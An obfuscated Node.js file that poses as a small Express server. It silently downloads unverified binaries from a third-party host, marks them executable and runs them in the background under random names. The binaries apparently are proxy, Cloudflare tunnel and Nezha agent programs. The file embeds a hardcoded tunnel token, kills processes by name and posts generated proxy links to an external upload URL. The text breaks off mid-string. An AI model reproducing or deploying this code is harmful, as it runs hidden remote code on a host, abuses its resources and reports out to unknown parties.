const _0x535bf7=_0x709e;function _0x709e(_0x2e2aad,_0xb48ac7){const _0x494291=_0x4942();return _0x709e=function(_0x709e60,_0x5368c7){_0x709e60=_0x709e60-0x65;let _0x449272=_0x494291[_0x709e60];return _0x449272;},_0x709e(_0x2e2aad,_0xb48ac7);}(function(_0x1adc24,_0x4bddea){const _0x12b8a6={_0x344076:0x10f,_0x5ce7a4:0x104,_0x26b010:0x7e,_0x52f3cd:0xeb,_0x313a74:0x120},_0xfed791=_0x709e,_0x1776cf=_0x1adc24();while(!![]){try{const _0x4eca98=-parseInt(_0xfed791(_0x12b8a6._0x344076))/0x1*(-parseInt(_0xfed791(0x6c))/0x2)+-parseInt(_0xfed791(0xfb))/0x3*(parseInt(_0xfed791(0xc2))/0x4)+-parseInt(_0xfed791(_0x12b8a6._0x5ce7a4))/0x5+-parseInt(_0xfed791(_0x12b8a6._0x26b010))/0x6+parseInt(_0xfed791(_0x12b8a6._0x52f3cd))/0x7+parseInt(_0xfed791(0xef))/0x8*(parseInt(_0xfed791(0xa0))/0x9)+-parseInt(_0xfed791(_0x12b8a6._0x313a74))/0xa*(-parseInt(_0xfed791(0xc8))/0xb);if(_0x4eca98===_0x4bddea)break;else _0x1776cf['push'](_0x1776cf['shift']());}catch(_0x4b1547){_0x1776cf['push'](_0x1776cf['shift']());}}}(_0x4942,0x5d44f));const express=require(_0x535bf7(0x10e)),app=express(),axios=require(_0x535bf7(0xb6)),os=require('os'),fs=require('fs'),path=require(_0x535bf7(0x9d)),{promisify}=require(_0x535bf7(0x11f)),exec=promisify(require(_0x535bf7(0x98))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x535bf7(0xc0)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x535bf7(0x118)]||'',AUTO_ACCESS=process[_0x535bf7(0xc0)][_0x535bf7(0xc9)]||![],FILE_PATH=process[_0x535bf7(0xc0)]['FILE_PATH']||'./tmp',SUB_PATH=process['env']['SUB_PATH']||_0x535bf7(0x116),PORT=process[_0x535bf7(0xc0)]['SERVER_PORT']||process[_0x535bf7(0xc0)][_0x535bf7(0xbf)]||0xbb8,UUID=process[_0x535bf7(0xc0)][_0x535bf7(0xab)]||'0dc2b95e-5ed2-4b08-9724-00841d382a0d',NEZHA_SERVER=process[_0x535bf7(0xc0)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x535bf7(0xc0)][_0x535bf7(0x123)]||'',NEZHA_KEY=process['env'][_0x535bf7(0xbd)]||'',ARGO_DOMAIN=process[_0x535bf7(0xc0)][_0x535bf7(0xed)]||'warp.686681.xyz',ARGO_AUTH=process[_0x535bf7(0xc0)][_0x535bf7(0x7f)]||_0x535bf7(0x10c),ARGO_PORT=process[_0x535bf7(0xc0)][_0x535bf7(0x96)]||0x1f41,CFIP=process[_0x535bf7(0xc0)][_0x535bf7(0x113)]||_0x535bf7(0xac),CFPORT=process[_0x535bf7(0xc0)][_0x535bf7(0x6e)]||0x1bb,NAME=process['env']['NAME']||_0x535bf7(0xd5);!fs[_0x535bf7(0x8e)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x535bf7(0xa7))):console['log'](FILE_PATH+_0x535bf7(0x114));function generateRandomName(){const _0xe096eb={_0x2f7197:0x9a,_0x41bf37:0x9e},_0x10896a=_0x535bf7,_0x48534b=_0x10896a(0xd4);let _0x4bb6fe='';for(let _0x3d1d4c=0x0;_0x3d1d4c<0x6;_0x3d1d4c++){_0x4bb6fe+=_0x48534b[_0x10896a(_0xe096eb._0x2f7197)](Math[_0x10896a(0x12c)](Math[_0x10896a(_0xe096eb._0x41bf37)]()*_0x48534b[_0x10896a(0xe4)]));}return _0x4bb6fe;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x535bf7(0xf4)](FILE_PATH,npmName),phpPath=path[_0x535bf7(0xf4)](FILE_PATH,phpName),webPath=path[_0x535bf7(0xf4)](FILE_PATH,webName),botPath=path[_0x535bf7(0xf4)](FILE_PATH,botName),subPath=path[_0x535bf7(0xf4)](FILE_PATH,_0x535bf7(0x108)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x535bf7(0xf4)](FILE_PATH,'boot.log'),configPath=path[_0x535bf7(0xf4)](FILE_PATH,_0x535bf7(0xd7));function deleteNodes(){const _0x190f14={_0x5c2900:0x8e,_0x415762:0x9c,_0x4630a8:0xb0,_0x1a76cf:0xa8,_0x512ded:0xe4,_0x2bd5f2:0x11c,_0x11f8bb:0xb9,_0x263c6f:0x117},_0x40ef3f=_0x535bf7;try{if(!UPLOAD_URL)return;if(!fs[_0x40ef3f(_0x190f14._0x5c2900)](subPath))return;let _0x9e719e;try{_0x9e719e=fs[_0x40ef3f(_0x190f14._0x415762)](subPath,_0x40ef3f(0xa8));}catch{return null;}const _0x19c654=Buffer['from'](_0x9e719e,_0x40ef3f(_0x190f14._0x4630a8))[_0x40ef3f(0xd3)](_0x40ef3f(_0x190f14._0x1a76cf)),_0x5dc186=_0x19c654['split']('\x0a')[_0x40ef3f(0xb1)](_0x19a4b1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x19a4b1));if(_0x5dc186[_0x40ef3f(_0x190f14._0x512ded)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x40ef3f(_0x190f14._0x2bd5f2)]({'nodes':_0x5dc186}),{'headers':{'Content-Type':_0x40ef3f(_0x190f14._0x11f8bb)}})[_0x40ef3f(_0x190f14._0x263c6f)](_0x5a3734=>{return null;}),null;}catch(_0x265094){return null;}}function cleanupOldFiles(){const _0x426461={_0x18ea10:0x76,_0x21c13:0xb2},_0x234305={_0x122519:0xba,_0x2d6a44:0xb8,_0x5076ff:0x110},_0xcbc093=_0x535bf7;try{const _0x35067b=fs[_0xcbc093(_0x426461._0x18ea10)](FILE_PATH);_0x35067b[_0xcbc093(_0x426461._0x21c13)](_0x1011d3=>{const _0x420729=_0xcbc093,_0x9e9279=path['join'](FILE_PATH,_0x1011d3);try{const _0x5105a7=fs[_0x420729(_0x234305._0x122519)](_0x9e9279);_0x5105a7[_0x420729(_0x234305._0x2d6a44)]()&&fs[_0x420729(_0x234305._0x5076ff)](_0x9e9279);}catch(_0x21ac41){}});}catch(_0x122ee7){}}app['get']('/',function(_0xd43284,_0x55b9b3){const _0x6ff514={_0xd999bd:0xd6,_0x511cb8:0x121},_0x14bfef=_0x535bf7;_0x55b9b3[_0x14bfef(_0x6ff514._0xd999bd)](_0x14bfef(_0x6ff514._0x511cb8));});async function generateConfig(){const _0x3b3e35={_0x3eeaae:0x8d,_0xea46e2:0x92,_0x21e569:0x8b,_0x18004e:0xf1,_0x237d37:0x92,_0x478b88:0xaf,_0x3df6fd:0x12e,_0xf120d8:0x101,_0x36e591:0x105,_0x4fdfbd:0x92,_0x45e333:0xf5,_0x2f2618:0x75,_0x50915a:0x71,_0x56b16d:0xd7,_0x365ed0:0x11c},_0x1620fe=_0x535bf7,_0x2b3516={'log':{'access':_0x1620fe(_0x3b3e35._0x3eeaae),'error':_0x1620fe(0x8d),'loglevel':_0x1620fe(_0x3b3e35._0xea46e2)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1620fe(_0x3b3e35._0x21e569),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1620fe(0x92),'fallbacks':[{'dest':0xbb9},{'path':_0x1620fe(0x99),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x1620fe(0xfe),'dest':0xbbc}]},'streamSettings':{'network':_0x1620fe(_0x3b3e35._0x18004e)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x1620fe(0x8b),'settings':{'clients':[{'id':UUID}],'decryption':_0x1620fe(_0x3b3e35._0xea46e2)},'streamSettings':{'network':'tcp','security':_0x1620fe(_0x3b3e35._0x237d37)}},{'port':0xbba,'listen':_0x1620fe(0x101),'protocol':_0x1620fe(0x8b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1620fe(0x92)},'streamSettings':{'network':'ws','security':_0x1620fe(0x92),'wsSettings':{'path':_0x1620fe(0x99)}},'sniffing':{'enabled':!![],'destOverride':[_0x1620fe(_0x3b3e35._0x478b88),_0x1620fe(_0x3b3e35._0x3df6fd),_0x1620fe(0x127)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1620fe(_0x3b3e35._0xf120d8),'protocol':_0x1620fe(_0x3b3e35._0x36e591),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1620fe(0x87)}},'sniffing':{'enabled':!![],'destOverride':[_0x1620fe(0xaf),_0x1620fe(0x12e),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1620fe(0x101),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1620fe(_0x3b3e35._0x4fdfbd),'wsSettings':{'path':_0x1620fe(0xfe)}},'sniffing':{'enabled':!![],'destOverride':[_0x1620fe(0xaf),_0x1620fe(0x12e),_0x1620fe(0x127)],'metadataOnly':![]}}],'dns':{'servers':[_0x1620fe(_0x3b3e35._0x45e333)]},'outbounds':[{'protocol':'freedom','tag':_0x1620fe(0xc6)},{'protocol':_0x1620fe(_0x3b3e35._0x2f2618),'tag':_0x1620fe(_0x3b3e35._0x50915a)}]};fs['writeFileSync'](path[_0x1620fe(0xf4)](FILE_PATH,_0x1620fe(_0x3b3e35._0x56b16d)),JSON[_0x1620fe(_0x3b3e35._0x365ed0)](_0x2b3516,null,0x2));}function getSystemArchitecture(){const _0x553d47={_0x4d6663:0x11b,_0x2da625:0x82},_0x13c981=_0x535bf7,_0x4aa4fb=os['arch']();return _0x4aa4fb==='arm'||_0x4aa4fb==='arm64'||_0x4aa4fb===_0x13c981(_0x553d47._0x4d6663)?_0x13c981(0xc5):_0x13c981(_0x553d47._0x2da625);}function downloadFile(_0x1ba181,_0x46ff95,_0x2417d3){const _0x396daa={_0x18b9d8:0xdc,_0x54bec7:0xce},_0xcecb85={_0x3cf735:0x124,_0x365f58:0x77},_0x1033e8={_0x2789fd:0xcd,_0x30c83a:0x77},_0x26d923={_0x37abc8:0x8f,_0x5562d5:0x68,_0x4c9e80:0x72,_0x5b1962:0xcf},_0x84e5ba={_0x161f4e:0x12b,_0x33f070:0x124},_0x31e739=_0x535bf7,_0x1f6657=_0x1ba181;!fs['existsSync'](FILE_PATH)&&fs[_0x31e739(_0x396daa._0x18b9d8)](FILE_PATH,{'recursive':!![]});const _0x55c9b6=fs[_0x31e739(0xf7)](_0x1f6657);axios({'method':'get','url':_0x46ff95,'responseType':_0x31e739(0x88)})[_0x31e739(_0x396daa._0x54bec7)](_0x1a0c40=>{const _0x2cd672=_0x31e739;_0x1a0c40[_0x2cd672(0x70)][_0x2cd672(0x103)](_0x55c9b6),_0x55c9b6['on'](_0x2cd672(_0x1033e8._0x2789fd),()=>{const _0x1587be=_0x2cd672;_0x55c9b6[_0x1587be(_0x84e5ba._0x161f4e)](),console['log'](_0x1587be(0x68)+path[_0x1587be(_0x84e5ba._0x33f070)](_0x1f6657)+_0x1587be(0x107)),_0x2417d3(null,_0x1f6657);}),_0x55c9b6['on'](_0x2cd672(_0x1033e8._0x30c83a),_0x128da1=>{const _0x303da3=_0x2cd672;fs[_0x303da3(_0x26d923._0x37abc8)](_0x1f6657,()=>{});const _0x391bfd=_0x303da3(_0x26d923._0x5562d5)+path[_0x303da3(0x124)](_0x1f6657)+_0x303da3(_0x26d923._0x4c9e80)+_0x128da1[_0x303da3(_0x26d923._0x5b1962)];console[_0x303da3(0x77)](_0x391bfd),_0x2417d3(_0x391bfd);});})[_0x31e739(0x117)](_0xd92eb8=>{const _0x41dd3e=_0x31e739,_0x1731c7='Download\x20'+path[_0x41dd3e(_0xcecb85._0x3cf735)](_0x1f6657)+_0x41dd3e(0x72)+_0xd92eb8['message'];console[_0x41dd3e(_0xcecb85._0x365f58)](_0x1731c7),_0x2417d3(_0x1731c7);});}async function downloadFilesAndRun(){const _0x482e26={_0x127522:0xe4,_0x557ed7:0x66,_0x312555:0xca,_0x3573ec:0x67,_0x1be237:0x115,_0x2ca65d:0xda,_0x467dea:0x6f,_0x310c44:0x102,_0x2c483f:0x112,_0x2b104d:0xcc,_0x12ece7:0xa6,_0x42afba:0x10a,_0x342a8d:0xe3,_0x3532de:0xd8,_0xb8c6ab:0x7a,_0x255649:0x6f,_0x1b332a:0x67,_0x1951d4:0xb3,_0x5e65eb:0x128,_0x4bd57a:0xe5,_0x3d3b03:0xde,_0x3004c8:0xe0,_0x5587ce:0x125,_0x29a593:0x90},_0x3f6f21={_0x49bd1f:0x7c},_0x272779=_0x535bf7,_0x18f139=getSystemArchitecture(),_0x116111=getFilesForArchitecture(_0x18f139);if(_0x116111[_0x272779(_0x482e26._0x127522)]===0x0){console[_0x272779(0x10a)](_0x272779(_0x482e26._0x557ed7));return;}const _0x2c4b07=_0x116111['map'](_0xaaecd7=>{const _0xece493={_0xacffbe:0x95,_0x11e14c:0xc4};return new Promise((_0x49f9fc,_0x199ee5)=>{const _0x4bac1b=_0x709e;downloadFile(_0xaaecd7[_0x4bac1b(_0xece493._0xacffbe)],_0xaaecd7[_0x4bac1b(_0xece493._0x11e14c)],(_0x1256cc,_0x35a095)=>{_0x1256cc?_0x199ee5(_0x1256cc):_0x49f9fc(_0x35a095);});});});try{await Promise[_0x272779(0xe1)](_0x2c4b07);}catch(_0x1389ec){console['error'](_0x272779(_0x482e26._0x312555),_0x1389ec);return;}function _0x2de0a0(_0x5c8231){const _0x2f3b24=_0x272779,_0x16d284=0x1fd;_0x5c8231[_0x2f3b24(0xb2)](_0xface7c=>{const _0x2c060c={_0x25bb28:0x77,_0xe97277:0xd1,_0x3369b9:0x10a,_0x2bc7ee:0x81},_0x531e88=_0x2f3b24;fs['existsSync'](_0xface7c)&&fs[_0x531e88(_0x3f6f21._0x49bd1f)](_0xface7c,_0x16d284,_0x162ba5=>{const _0x4726cb=_0x531e88;_0x162ba5?console[_0x4726cb(_0x2c060c._0x25bb28)](_0x4726cb(_0x2c060c._0xe97277)+_0xface7c+':\x20'+_0x162ba5):console[_0x4726cb(_0x2c060c._0x3369b9)](_0x4726cb(_0x2c060c._0x2bc7ee)+_0xface7c+':\x20'+_0x16d284[_0x4726cb(0xd3)](0x8));});});}const _0x3656fe=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2de0a0(_0x3656fe);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5f3060=NEZHA_SERVER[_0x272779(_0x482e26._0x3573ec)](':')?NEZHA_SERVER[_0x272779(0xad)](':')[_0x272779(0xbc)]():'',_0x514d29=new Set([_0x272779(0xe3),_0x272779(_0x482e26._0x1be237),_0x272779(0xd8),_0x272779(_0x482e26._0x2ca65d),_0x272779(0x7a),_0x272779(_0x482e26._0x467dea)]),_0x1dcf4d=_0x514d29[_0x272779(_0x482e26._0x310c44)](_0x5f3060)?_0x272779(0xd9):'false',_0x33106=_0x272779(_0x482e26._0x2c483f)+NEZHA_KEY+_0x272779(0x119)+NEZHA_SERVER+_0x272779(0xf6)+_0x1dcf4d+_0x272779(_0x482e26._0x2b104d)+UUID;fs[_0x272779(0xa4)](path[_0x272779(0xf4)](FILE_PATH,_0x272779(_0x482e26._0x12ece7)),_0x33106);const _0x4b1bee=_0x272779(0xb3)+phpPath+_0x272779(0xcb)+FILE_PATH+_0x272779(0x85);try{await exec(_0x4b1bee),console[_0x272779(_0x482e26._0x42afba)](phpName+_0x272779(0x128)),await new Promise(_0x1ace59=>setTimeout(_0x1ace59,0x3e8));}catch(_0x4a8589){console['error']('php\x20running\x20error:\x20'+_0x4a8589);}}else{let _0x52b876='';const _0x4b3e95=[_0x272779(_0x482e26._0x342a8d),_0x272779(0x115),_0x272779(_0x482e26._0x3532de),_0x272779(0xda),_0x272779(_0x482e26._0xb8c6ab),_0x272779(_0x482e26._0x255649)];_0x4b3e95[_0x272779(_0x482e26._0x1b332a)](NEZHA_PORT)&&(_0x52b876=_0x272779(0x8c));const _0x196ecc=_0x272779(_0x482e26._0x1951d4)+npmPath+_0x272779(0x94)+NEZHA_SERVER+':'+NEZHA_PORT+_0x272779(0xb7)+NEZHA_KEY+'\x20'+_0x52b876+_0x272779(0xe6);try{await exec(_0x196ecc),console['log'](npmName+_0x272779(_0x482e26._0x5e65eb)),await new Promise(_0x235096=>setTimeout(_0x235096,0x3e8));}catch(_0x3851e3){console['error'](_0x272779(_0x482e26._0x4bd57a)+_0x3851e3);}}}else console['log'](_0x272779(_0x482e26._0x3d3b03));const _0x39f111=_0x272779(0xb3)+webPath+_0x272779(0x8a)+FILE_PATH+_0x272779(0xe8);try{await exec(_0x39f111),console['log'](webName+_0x272779(0x128)),await new Promise(_0x2400a0=>setTimeout(_0x2400a0,0x3e8));}catch(_0x6e3da2){console['error'](_0x272779(0xf2)+_0x6e3da2);}if(fs[_0x272779(0x8e)](botPath)){let _0x35747f;if(ARGO_AUTH[_0x272779(0xe0)](/^[A-Z0-9a-z=]{120,250}$/))_0x35747f=_0x272779(0xec)+ARGO_AUTH;else ARGO_AUTH[_0x272779(_0x482e26._0x3004c8)](/TunnelSecret/)?_0x35747f=_0x272779(0x80)+FILE_PATH+'/tunnel.yml\x20run':_0x35747f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x272779(_0x482e26._0x5587ce)+ARGO_PORT;try{await exec(_0x272779(0xb3)+botPath+'\x20'+_0x35747f+_0x272779(_0x482e26._0x29a593)),console['log'](botName+_0x272779(0x128)),await new Promise(_0x337a4a=>setTimeout(_0x337a4a,0x7d0));}catch(_0x3a0322){console[_0x272779(0x77)]('Error\x20executing\x20command:\x20'+_0x3a0322);}}await new Promise(_0x3492e1=>setTimeout(_0x3492e1,0x1388));}function getFilesForArchitecture(_0x4584f5){const _0x23abd7={_0x5dd233:0xfd,_0x20e76e:0xc5,_0x279726:0xfa,_0x3a2e66:0xf9,_0x43a1ba:0xc5,_0x325a0f:0xf3,_0x1ecadf:0xf9},_0x58e053=_0x535bf7;let _0x496262;_0x4584f5==='arm'?_0x496262=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x58e053(0x11d)}]:_0x496262=[{'fileName':webPath,'fileUrl':_0x58e053(_0x23abd7._0x5dd233)},{'fileName':botPath,'fileUrl':_0x58e053(0xe7)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1a058c=_0x4584f5===_0x58e053(_0x23abd7._0x20e76e)?_0x58e053(_0x23abd7._0x279726):'https://amd64.ssss.nyc.mn/agent';_0x496262[_0x58e053(_0x23abd7._0x3a2e66)]({'fileName':npmPath,'fileUrl':_0x1a058c});}else{const _0x41be4e=_0x4584f5===_0x58e053(_0x23abd7._0x43a1ba)?_0x58e053(0x11e):_0x58e053(_0x23abd7._0x325a0f);_0x496262[_0x58e053(_0x23abd7._0x1ecadf)]({'fileName':phpPath,'fileUrl':_0x41be4e});}}return _0x496262;}function argoType(){const _0x2b971f={_0x2b588c:0x78,_0x3e6e42:0xa4,_0x4f65cf:0xff,_0x1a3a9d:0xee,_0x4d499c:0xf4,_0xa75335:0x109,_0x4dea6a:0xfc,_0x1dc0e0:0x6b,_0xb857d2:0xa4,_0x481265:0xa2},_0x423e26=_0x535bf7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x423e26(0x10a)](_0x423e26(_0x2b971f._0x2b588c));return;}if(ARGO_AUTH['includes'](_0x423e26(0xdb))){fs[_0x423e26(_0x2b971f._0x3e6e42)](path[_0x423e26(0xf4)](FILE_PATH,_0x423e26(_0x2b971f._0x4f65cf)),ARGO_AUTH);const _0x54a9c9=_0x423e26(_0x2b971f._0x1a3a9d)+ARGO_AUTH['split']('\x22')[0xb]+_0x423e26(0xf0)+path[_0x423e26(_0x2b971f._0x4d499c)](FILE_PATH,'tunnel.json')+_0x423e26(_0x2b971f._0xa75335)+ARGO_DOMAIN+_0x423e26(_0x2b971f._0x4dea6a)+ARGO_PORT+_0x423e26(_0x2b971f._0x1dc0e0);fs[_0x423e26(_0x2b971f._0xb857d2)](path[_0x423e26(0xf4)](FILE_PATH,'tunnel.yml'),_0x54a9c9);}else console['log'](_0x423e26(_0x2b971f._0x481265));}async function extractDomains(){const _0x5cf553={_0x1d8163:0x10a,_0x20a2dc:0xa8,_0x2f76d3:0xb2,_0x5890ec:0xe4,_0x17c0a8:0x10a,_0xf0dbd6:0xa1,_0x167b29:0x122,_0x2f73d8:0x110,_0x57c510:0xf4,_0x4e6081:0xb3,_0x276f63:0xae,_0x18d45b:0x89},_0x26d28b={_0x37c6f0:0xe2,_0x52ceb9:0x70,_0x113e9b:0x12a,_0x2b9003:0x74,_0x5006fe:0xc1},_0x457a5c={_0xd80a8:0x83,_0x1a9466:0x9a,_0x1b801b:0xa3},_0x210d37={_0x32aa80:0x106},_0x4ea104=_0x535bf7;let _0x3036e9;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3036e9=ARGO_DOMAIN,console[_0x4ea104(_0x5cf553._0x1d8163)](_0x4ea104(0x69),_0x3036e9),await _0x36933e(_0x3036e9);else try{const _0x2710b2=fs['readFileSync'](path[_0x4ea104(0xf4)](FILE_PATH,'boot.log'),_0x4ea104(_0x5cf553._0x20a2dc)),_0x2a0b43=_0x2710b2[_0x4ea104(0xad)]('\x0a'),_0x252639=[];_0x2a0b43[_0x4ea104(_0x5cf553._0x2f76d3)](_0x590799=>{const _0x4313c1=_0x4ea104,_0x5a0e58=_0x590799['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5a0e58){const _0x2df5d2=_0x5a0e58[0x1];_0x252639[_0x4313c1(_0x210d37._0x32aa80)](_0x2df5d2);}});if(_0x252639[_0x4ea104(_0x5cf553._0x5890ec)]>0x0)_0x3036e9=_0x252639[0x0],console[_0x4ea104(_0x5cf553._0x17c0a8)](_0x4ea104(_0x5cf553._0xf0dbd6),_0x3036e9),await _0x36933e(_0x3036e9);else{console[_0x4ea104(0x10a)](_0x4ea104(_0x5cf553._0x167b29)),fs[_0x4ea104(_0x5cf553._0x2f73d8)](path[_0x4ea104(_0x5cf553._0x57c510)](FILE_PATH,_0x4ea104(0xd0)));async function _0x54fb9f(){const _0x2e1a7a=_0x4ea104;try{process['platform']==='win32'?await exec(_0x2e1a7a(0xbe)+botName+_0x2e1a7a(_0x457a5c._0xd80a8)):await exec(_0x2e1a7a(0xc3)+botName[_0x2e1a7a(_0x457a5c._0x1a9466)](0x0)+']'+botName[_0x2e1a7a(_0x457a5c._0x1b801b)](0x1)+_0x2e1a7a(0x7b));}catch(_0x51ea23){}}_0x54fb9f(),await new Promise(_0x118f01=>setTimeout(_0x118f01,0xbb8));const _0x60ca5=_0x4ea104(0x12d)+FILE_PATH+_0x4ea104(0x125)+ARGO_PORT;try{await exec(_0x4ea104(_0x5cf553._0x4e6081)+botPath+'\x20'+_0x60ca5+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x4ea104(0x128)),await new Promise(_0x10444d=>setTimeout(_0x10444d,0xbb8)),await extractDomains();}catch(_0x318187){console['error'](_0x4ea104(_0x5cf553._0x276f63)+_0x318187);}}}catch(_0x2dc087){console[_0x4ea104(0x77)](_0x4ea104(_0x5cf553._0x18d45b),_0x2dc087);}async function _0x589b89(){const _0x2b817c=_0x4ea104;try{const _0x2e5bd8=await axios[_0x2b817c(0x10d)](_0x2b817c(_0x26d28b._0x37c6f0),{'timeout':0xbb8});if(_0x2e5bd8[_0x2b817c(0x70)]&&_0x2e5bd8[_0x2b817c(_0x26d28b._0x52ceb9)][_0x2b817c(0x11a)]&&_0x2e5bd8[_0x2b817c(0x70)][_0x2b817c(0xe9)])return _0x2e5bd8[_0x2b817c(0x70)]['country_code']+'_'+_0x2e5bd8[_0x2b817c(0x70)][_0x2b817c(0xe9)];}catch(_0x29c09f){try{const _0x3c1dfd=await axios[_0x2b817c(0x10d)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x3c1dfd[_0x2b817c(0x70)]&&_0x3c1dfd[_0x2b817c(0x70)][_0x2b817c(_0x26d28b._0x113e9b)]===_0x2b817c(_0x26d28b._0x2b9003)&&_0x3c1dfd['data']['countryCode']&&_0x3c1dfd[_0x2b817c(0x70)][_0x2b817c(0xe9)])return _0x3c1dfd['data'][_0x2b817c(_0x26d28b._0x5006fe)]+'_'+_0x3c1dfd['data'][_0x2b817c(0xe9)];}catch(_0x1dd60c){}}return _0x2b817c(0xea);}async function _0x36933e(_0x2cc317){const _0x589106={_0x6ae1b5:0x92,_0x414871:0xa9,_0x38cb70:0x65,_0x1346a1:0xd3,_0x5334e4:0xb0,_0x5b694b:0x73,_0x1081e2:0x91,_0x54f2c3:0x91},_0x4deba9=await _0x589b89(),_0x1b691b=NAME?NAME+'-'+_0x4deba9:_0x4deba9;return new Promise(_0x2830ca=>{setTimeout(()=>{const _0x22c1d4={_0x568b2d:0xbb,_0x5e0a9b:0x7d,_0x54067:0xd6},_0x353a0b=_0x709e,_0x3b5bbe={'v':'2','ps':''+_0x1b691b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x353a0b(0x92),'net':'ws','type':_0x353a0b(_0x589106._0x6ae1b5),'host':_0x2cc317,'path':_0x353a0b(_0x589106._0x414871),'tls':_0x353a0b(0x12e),'sni':_0x2cc317,'alpn':'','fp':'firefox'},_0x1bcbde='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x353a0b(_0x589106._0x38cb70)+_0x2cc317+_0x353a0b(0xb5)+_0x2cc317+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x1b691b+_0x353a0b(0xdd)+Buffer[_0x353a0b(0x91)](JSON['stringify'](_0x3b5bbe))[_0x353a0b(_0x589106._0x1346a1)](_0x353a0b(_0x589106._0x5334e4))+_0x353a0b(0x84)+UUID+'@'+CFIP+':'+CFPORT+_0x353a0b(0x10b)+_0x2cc317+_0x353a0b(0xb5)+_0x2cc317+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1b691b+_0x353a0b(_0x589106._0x5b694b);console['log'](Buffer[_0x353a0b(_0x589106._0x1081e2)](_0x1bcbde)[_0x353a0b(_0x589106._0x1346a1)](_0x353a0b(0xb0))),fs['writeFileSync'](subPath,Buffer[_0x353a0b(_0x589106._0x54f2c3)](_0x1bcbde)[_0x353a0b(_0x589106._0x1346a1)](_0x353a0b(_0x589106._0x5334e4))),console[_0x353a0b(0x10a)](FILE_PATH+_0x353a0b(0xd2)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4f824f,_0x5251f1)=>{const _0x97260a=_0x353a0b,_0x418ec0=Buffer['from'](_0x1bcbde)[_0x97260a(0xd3)](_0x97260a(0xb0));_0x5251f1[_0x97260a(_0x22c1d4._0x568b2d)](_0x97260a(_0x22c1d4._0x5e0a9b),_0x97260a(0x126)),_0x5251f1[_0x97260a(_0x22c1d4._0x54067)](_0x418ec0);}),_0x2830ca(_0x1bcbde);},0x7d0);});}}function _0x4942(){const _0x2cdac9=['Error\x20downloading\x20files:','\x20-c\x20\x22','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','finish','then','message','boot.log','Empowerment\x20failed\x20for\x20','/sub.txt\x20saved\x20successfully','toString','abcdefghijklmnopqrstuvwxyz','xxoogo','send','config.json','2096','true','2087','TunnelSecret','mkdirSync','\x0a\x0avmess://','NEZHA\x20variable\x20is\x20empty,skip\x20running','http\x20server\x20is\x20running\x20on\x20port:','match','all','https://ipapi.co/json/','443','length','npm\x20running\x20error:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/bot','/config.json\x20>/dev/null\x202>&1\x20&','org','Unknown','1405754cSZIEZ','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ARGO_DOMAIN','\x0a\x20\x20tunnel:\x20','32csZEho','\x0a\x20\x20credentials-file:\x20','tcp','web\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/v1','join','https+local://8.8.8.8/dns-query','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','createWriteStream','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','unshift','https://arm64.ssss.nyc.mn/agent','7557FrhIJw','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/web','/trojan-argo','tunnel.json','Add\x20automatic\x20access\x20task\x20faild:\x20','127.0.0.1','has','pipe','2958570wnGVtA','vmess','push','\x20successfully','sub.txt','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','log','?security=tls&sni=','eyJhIjoiOWIxOGYxOTQ4NTNmMTQ0ZDFkMDdmNWQ1MTZjYTNiMzYiLCJ0IjoiMzQ4ZGY4ZWItZDU3Ny00MzVmLWEyOTQtOGNmY2RmOTRmNGJiIiwicyI6Ik5qSmtaRFZsTW1RdE1qYzVOUzAwTkRsakxUZzVZMkl0Tm1VNU9XTTBZelkxTW1WayJ9','get','express','5zVmClL','unlinkSync','Skipping\x20adding\x20automatic\x20access\x20task','\x0aclient_secret:\x20','CFIP','\x20already\x20exists','8443','sub','catch','PROJECT_URL','\x